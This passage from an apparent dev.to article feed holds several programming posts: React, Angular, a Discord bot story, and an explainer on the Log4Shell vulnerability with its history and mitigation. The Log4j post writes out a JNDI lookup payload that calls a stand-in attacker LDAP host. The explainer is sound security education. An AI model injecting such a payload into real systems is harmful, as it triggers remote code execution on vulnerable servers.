&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll also make changes to our &lt;code&gt;profile.js&lt;/code&gt; so let's open it up and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;navigate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;signOut&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;removeItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;navigate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="na"&gt;marginTop&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="na"&gt;minHeight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;700&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Hello&lt;/span&gt; &lt;span class="nx"&gt;there&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;welcome&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;your&lt;/span&gt; &lt;span class="nx"&gt;profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/p&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;button&lt;/span&gt; &lt;span class="nx"&gt;onClick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;signOut&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;sign&lt;/span&gt; &lt;span class="nx"&gt;out&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/button&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We're done, let' test our app . Run the code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;uvicorn main:app &lt;span class="nt"&gt;--reload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jiX8kdCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bga185xeiqrih0bse69.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jiX8kdCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3bga185xeiqrih0bse69.gif" alt="finish" width="880" height="265"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;In tutorial, we looked at what FastApi is and also what React is. We also learned how to install FastApi as well as React using these ideas to build our login authenication. Here's a link to the repo on &lt;a href="https://github.com/oyedeletemitope/login-authentication-with-react-and-FastAPI"&gt;github&lt;/a&gt;. Happy coding!!!&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>python</category>
      <category>webdev</category>
      <category>react</category>
    </item>
    <item>
      <title>Understanding Built In Angular Directives - Part 5</title>
      <author>Anubhab Mukherjee</author>
      <pubDate>Fri, 24 Dec 2021 19:40:23 +0000</pubDate>
      <link>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</link>
      <guid>https://dev.to/anubhab5/understanding-built-in-angular-directives-part-5-gli</guid>
      <description>&lt;p&gt;&lt;strong&gt;T&lt;/strong&gt;oday we will cover another important structural directive provided by the Angular Team - &lt;code&gt;ngFor&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ngFor&lt;/code&gt;&lt;br&gt;
The ngFor directive is used to loop through an array of items in the template. The element where the directive is written becomes the parent which is repeated.&lt;/p&gt;

&lt;p&gt;Lets see that in practice-&lt;br&gt;
We need to update our &lt;em&gt;structural-directive-demo.component.ts&lt;/em&gt; file and add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;itemsToBuy = ['Pencil', 'Notebook', 'School bag', 'Eraser'];
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and in component template file add the below code -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;div *ngFor="let item of itemsToBuy"&amp;gt;
  {{ item }}
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now if you start the application and open localhost:4200 in the browser you would see the below output -&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4yZ94l4K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lgn3bdgawv76ii3jint6.PNG" alt="Image description" width="351" height="194"&gt;&lt;/a&gt;&lt;br&gt;
Now lets understand the below code&lt;br&gt;
&lt;code&gt;*ngFor="let item of itemsToBuy"&lt;/code&gt; &lt;br&gt;
Here ngFor is a structural directive so the * is appended at the start followed by the equals &lt;code&gt;=&lt;/code&gt; operator.&lt;br&gt;
Here &lt;code&gt;itemsToBuy&lt;/code&gt; is the array we declared in the component TS file. We use the for-of syntax to loop through the array. Every item in the array is assigned to the variable &lt;code&gt;item&lt;/code&gt; which is then printed in between div tag by using the &lt;code&gt;{{item}}&lt;/code&gt;. The loop is auto incremented and moves to the next item until all the items are printed.&lt;br&gt;
In the above example &lt;code&gt;item&lt;/code&gt; variable holds a string value.&lt;br&gt;
Similarly the array can also be a &lt;u&gt;list of objects&lt;/u&gt;. &lt;br&gt;
In that case at every iteration item would hold an object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A word of Caution&lt;/strong&gt;&lt;br&gt;
You should not use two structural directives on the same element.&lt;/p&gt;

&lt;p&gt;For example ngIf and ngFor at the same div element is not allowed.&lt;/p&gt;

&lt;p&gt;That's all about &lt;code&gt;ngFor&lt;/code&gt;. Hope you enjoyed the post.&lt;br&gt;
Please like, comment and share&lt;br&gt;
The last structural directive is on your way. So stay tuned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cheers&lt;/strong&gt;!!!&lt;br&gt;
&lt;em&gt;Happy Coding&lt;/em&gt;&lt;/p&gt;

</description>
      <category>angular</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Apache Log4j : Return of the JNDI</title>
      <author>Shubham Sah</author>
      <pubDate>Fri, 24 Dec 2021 19:28:52 +0000</pubDate>
      <link>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</link>
      <guid>https://dev.to/shubhamsah/apache-log4j-return-of-the-jndi-292o</guid>
      <description>&lt;p&gt;It seems surreal seeing log4j, a logging utility in the news and all over the internet. How is it that a little over &lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;35000&lt;/a&gt; java packages, amounting to 8% of the Maven Central Repository has been impacted due to the log4shell vulnerability. How is it that a vulnerability in a logging library could result in a &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;CVSS score&lt;/a&gt; of 10[the highest it can go is 10]. This classic java logging library hitting mainstream feels so odd. Two different worlds that shouldn't be meeting.&lt;/p&gt;

&lt;p&gt;In this blog, let's understand what is log4j and what exactly is this log4shell vulnerability and why it happened? &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--H8KmtozX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0hr3cazeqq8tatk0j8sr.jpeg" alt="log4shell" width="700" height="760"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is log4j?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/apache/logging-log4j2"&gt;Apache Log4j&lt;/a&gt; is one of the most utilized logging library in the Java ecosystem. If you ever worked within a Java application, you've probably seen log4j in action. Log4j along with the basic logging capabilities, it provides additional features like log levels, a mechanism to write to different files, log rolling patterns. Although logging in java is quite a hell, log4j has been doing its job pretty fine over the years. I wanted to introduce log4j and its basic features to understand the bigger picture. So here is a simple java example using log4j.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8MTfjpaD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/th7a4qsj0m1qpwmuvgov.png" alt="Log4j Example" width="880" height="584"&gt;&lt;/a&gt;&lt;br&gt;
In the above snippet, we are getting a logger instance &lt;code&gt;logger = LogManager.getLogger();&lt;/code&gt; and we are calling &lt;code&gt;logger.info("Hello World");&lt;/code&gt; to log a basic message. Besides this, log4j can be heavily configured. You can learn more on configuring log4j &lt;a href="https://logging.apache.org/log4j/2.x/manual/configuration.html"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j-vulnerability-aka-log4shell-"&gt;
  &lt;/a&gt;
  &lt;strong&gt;What is Log4j vulnerability aka Log4Shell? :&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Log4j by default supported a logging capability called lookups. Lookups in log4j are a way to add a value to the log4j configuration. This means it can interpolate specific strings at the time of logging the message. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2CpPDRSM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1a80i6ye8403f91n9d0l.png" alt="log4j.xml" width="880" height="384"&gt;&lt;/a&gt;&lt;br&gt;
For example the environment lookup &lt;code&gt;$${env:USER}&lt;/code&gt; allows us to add environment variables in the log message.&lt;br&gt;
One of the supported lookups in log4j is the JNDI Lookups which allows variables to be retrieved via JNDI which supports LDAP. To better understand how it can create a problem let's understand &lt;strong&gt;JNDI&lt;/strong&gt;&lt;br&gt;
JNDI as it stands for Java Naming and Directory Interface provides an API for applications to interact with remote objects which are registered with the RMI registry or directory services like LDAP. A java-based application can make use of JNDI and LDAP to retrieve a business object containing data it might need, a pretty cool feature. This LDAP server could be remote or local. As a result, if a string which would look like &lt;code&gt;${jndi:ldap://attackServer.com/Exploit}&lt;/code&gt; was to be ever logged, JNDI would make a remote request to the LDAP server 'attackServer.com', request the file Exploit from the webserver and execute the request, And BOOM you get a REMOTE CODE EXECUTION (RCE).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--akcOgH-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a2cm89yn2q6zu7bkhlyh.png" alt="Log4j attack cycle" width="700" height="388"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Log4j is such a popular library that even if you aren't using it directly, you might depend upon another library which actually uses log4j for their logging purpose or that might depend on another library that might use log4j. At this point, considering the popularity of log4j there is a good chance that any decent sized java application might be using Log4j. According to a dev-sec company called &lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;Synk&lt;/a&gt; found that about 60% application they scanned uses log4j indirectly and not depending on it directly.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zMZgZvwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4mwe42s6gtnxzomhuwbs.png" alt="Synk Log4j scan" width="757" height="450"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-did-the-vulnerability-happen"&gt;
  &lt;/a&gt;
  &lt;strong&gt;How did the vulnerability happen?&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Now that we have a basic understanding of how the vulnerability works, the bigger question is how did this happen? &lt;br&gt;
You would be surprised that this exploit was sitting like a duck ready to be exploited for more than 8 years and no one noticed it. Let us understand the timeline.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;On 10th of December&lt;/a&gt;, Apache published an advisory for CVE 2021-44228 with an update for log4j. So unlike the internet's belief, it was not discovered in Minecraft. It was first reported by Chen Zhaojun from the Alibaba Cloud Security Team on 26th November 2021. The Apache log4j team was made aware of the bug on &lt;a href="https://github.com/apache/logging-log4j2/pull/608/commits"&gt;30th November 2021&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Rolling back to 2013, when a new feature patch was submitted to log4j to add log4j JNDI lookups, sounded like a cool feature. But this was the introduction of vulnerability. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-313"&gt;Reference here&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;In 2014, somebody wanted to disable date lookups because of the compatibility issues with other libraries and So a feature was asked to disable lookups. A new feature &lt;code&gt;%msg{nolookups}&lt;/code&gt; was added. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-905"&gt;Reference Here&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Fast forward to 2017, a new config option was added &lt;code&gt;formatmsgNoLookups&lt;/code&gt; which disables lookups globally. &lt;a href="https://issues.apache.org/jira/browse/LOG4J2-2109"&gt;Reference Here&lt;/a&gt; This now applies to &lt;code&gt;%msg{nolookups}&lt;/code&gt;, so you don't have to replace and configure all log messages with &lt;code&gt;%msg{nolookups}&lt;/code&gt; anymore. Both &lt;code&gt;%msg{nolookups}&lt;/code&gt; and &lt;code&gt;formatmsgNoLookups&lt;/code&gt; were proposed as the initial mitigation approach for the log4shell vulnerability for users who could not update their log4j dependency but was later scrapped. &lt;/li&gt;
&lt;li&gt;And in 2021 we finally get an advisory about the &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"&gt;RCE &lt;/a&gt;in the log4j utility tool. &lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;
  &lt;a href="#but-wait-a-minute-this-is-not-the-complete-timeline-there-is-a-significant-thing-that-is-missing"&gt;
  &lt;/a&gt;
  But wait a minute this is not the complete timeline, there is a significant thing that is missing
&lt;/h3&gt;

&lt;p&gt;In 2016, something important happened. Let's talk about the JNDI and the LDAP exploitation.&lt;br&gt;
In 2016, at BlackHat, there was a talk by &lt;a href="https://twitter.com/pwntester"&gt;Alvaro Muñoz&lt;/a&gt; named &lt;strong&gt;&lt;u&gt;A journey from JNDI/LDAP Manipulation to RCE DreamLand.&lt;/u&gt;&lt;/strong&gt; &lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Y8a5nB-vy78"&gt;
&lt;/iframe&gt;
&lt;br&gt;
In this talk, they presented research into the JNDI and specifically the LDAP and RMI features. It turns out that you can basically "Store" java serialized objects in LDAP and then a JNDI lookup is not looking at just a basic string but maybe a complex java object. And this is where we enter the world of arbitrary code execution.&lt;br&gt;
In the java development world, people love to send complete objects over the network. And most of the Java Remote code execution CVEs are a result of arbitrary object deserialization or class. There is a java Security Manager object where you can set certain policies to prevent or sandbox arbitrary remote code execution. But yeah this whole object serialization and remote class loading is a java feature.&lt;/p&gt;

&lt;p&gt;And there we have a complete timeline of the log4shell vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mY00MdGI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aek77zrzktymrgkny197.jpeg" alt="log4shell meme" width="574" height="499"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I think this thing shows that Pandora's box is now open, people are going to be looking at every open-source libraries, every closed source libraries to find similar things where this can come along.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#mitigation-guide"&gt;
  &lt;/a&gt;
  Mitigation Guide:
&lt;/h2&gt;

&lt;p&gt;Organizations and developers are urged to upgrade to Log4j 2.17.0 (for Java 8), 2.12.3 (for Java 7) and 2.3.1 (for Java 6), and review and monitor the &lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;Apache Log4j Security Vulnerabilities webpage&lt;/a&gt; for updates and mitigation guidance. &lt;br&gt;
&lt;a href="https://github.com/cisagov/log4j-affected-db"&gt;A community-sourced GitHub repository&lt;/a&gt; has been created for any information regarding the mitigation process and the vendors details.&lt;/p&gt;

&lt;p&gt;Thanks for reading this blog, if you find it valuable then give it an applaud 👏&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://logging.apache.org/log4j/2.x/security.html"&gt;https://logging.apache.org/log4j/2.x/security.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"&gt;https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/"&gt;https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/"&gt;https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"&gt;https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>java</category>
      <category>security</category>
      <category>log4shell</category>
      <category>log4j</category>
    </item>
    <item>
      <title>Aspiring 16 year old quant developer contributing to Open Source Application</title>
      <author>northern-64bit</author>
      <pubDate>Fri, 24 Dec 2021 19:26:40 +0000</pubDate>
      <link>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</link>
      <guid>https://dev.to/northern64bit/aspiring-16-year-old-quant-developer-contributing-to-open-source-application-16k4</guid>
      <description>&lt;p&gt;You may wonder who I am after reading the title. I’m a 16 year old who is in high school, with the dream of becoming a quant developer. This is my dream as I know this role comes with many flexible tasks, it uses math &amp;amp; finance which I find very interesting and where I can, apply my coding skills. &lt;/p&gt;

&lt;p&gt;I have been developing computer programs since I was 11 years old. The first programming language I learned was html if you even dare to call it one. Quickly after this, I learned JavaScript, Python and then C. Python is by far my favourite programming language, since it’s easy to use, clear and has many powerful libraries. &lt;/p&gt;

&lt;p&gt;I started to make my own programs and discovered that I could use Python libraries to speed up development. From this, I learned about open-source projects which helped me a lot as I was able to read code from more experienced developers which helped me learn solutions in my code and improved my coding skills. After a while, I thought it was time to publish my own open-source repository: A stocks discord bot, which is a bot version of one of my GitHub stock programs, to possibly help other developers and traders.&lt;/p&gt;

&lt;p&gt;Another thing that I’ve heard that’s very important is networking. So, I thought that it would be best to contribute to a project with a large community, high coding standard (to learn from it) and experienced contributors that are ready to help. If I stick to this, I thought, I may even get to get some valuable connections to industry professionals.&lt;/p&gt;

&lt;p&gt;In August 2021, I sent a message to the Gamestonk Terminal (GST) Discord after seeing their brilliant work and discovering it. At that time, I was working on my previously mentioned open-source Discord bot and was motivated to continue with it. However, I immediately changed my mind after seeing all the features of GST and their contributor’s work. &lt;/p&gt;

&lt;p&gt;The repository was nearly a match made in heaven, since it was scripted in python, has multiple pull requests merged every day, and maintains high code standard by experienced developers. In addition, it’s the best financial open-source project on GitHub (at least according to me). &lt;/p&gt;

&lt;p&gt;Based on my experience with Discord bots, I got the idea of implementing one specifically for GST. The more I thought about it, the better of an idea it was in my mind. The reasons were that the bot can be widely distributed to phones, since it’s so easy to use via the Discord chat and can even be used by non-tech savvy users, a bot makes it easier to get fresh and easily shareable data for your investment conversations.&lt;br&gt;
I knew that by adding the bot to GST, the project would grow and be better since more users would get to know it. So, I asked in the Discord server of the repository if I could help and possibly make a Discord bot to make it more widely distributed and usable on the phone.&lt;/p&gt;

&lt;p&gt;To my surprise the response was very positive and I started to develop it right away. In the beginning I was a bit lost, since I have never thought about code architecture (most of my other applications were a 1000+ lines in one huge file) and I got the responsibility of the whole project. These troubles got quickly fixed after some calls with the creator of GST, Didier R. Lopes, who really helped me; I learned lots about making a robust, structured and easily understandable application. &lt;/p&gt;

&lt;p&gt;From then on it was just adding feature after feature and improvements from many other GST contributors. This was the case until I had several difficult challenges. The first one was that we wanted to implement a menu like the terminal has – this was solved by adding reactions: 0,1,2,3,..9 to the message so the user could select the command through a reaction. The next challenge was when a menu had more than 10 commands – which I solved by implementing “pagination”, which is a sort of scrolling system via buttons formatting the message like a book. However, this resulted in an additional bug with the emoji detection system due to it being loop and the “pagination” being a loop too. Therefore, I started to experiment with multithreading of which I knew nothing about. But after some time, I managed to merge the code bits from the two loops together into one loop.&lt;/p&gt;

&lt;p&gt;Overall, the development process was exciting and a great learning experience that I wish every other young developer can have. My two cents are to make real useful code with simplicity and understandability in mind to improve your code, since it helps more than leetcode and super theoretical programs that never can be contributed to by other programmers.&lt;/p&gt;

&lt;p&gt;The hard part (or rather the time-consuming part) is to understand code from other people to the extent that you can contribute to it in a meaningful way, so I needed to learn to use many other libraries. This is not meant to discourage you, but to get real hands-on experience with the libraries. It’s also more meaningful to learn more new libraries and function if it has a purpose. &lt;/p&gt;

&lt;p&gt;The Discord bot has a multitude of functions from the terminal and is easy to set up &amp;amp; host so that it’s easy to use the terminal on any device and to share it with other people. It’s also awesome to use it to show the underlying data of your investing thesis quickly to your friends in your own Discord server.&lt;/p&gt;

&lt;p&gt;Here’s a link to it:&lt;br&gt;
&lt;a href="https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot"&gt;https://github.com/GamestonkTerminal/GamestonkTerminal/tree/main/discordbot&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Currently I’m looking forward to improving the bot and continue to work with the GST team. My long-term goal is to become a quant (quantitative analyst/researcher/developer), but there’s a long way there since I’m currently only in high school. Thus, I’m ready to contribute on other finance open-source applications at any time, so please contact me on GitHub: &lt;a href="https://github.com/northern-64bit"&gt;https://github.com/northern-64bit&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Merry Christmas! &lt;br&gt;
northern-64bit&lt;/p&gt;

</description>
      <category>opensource</category>
      <category>discord</category>
    </item>
    <item>
      <title>Skills That You Should Master In 2022</title>
      <author>Danish Saleem</author>
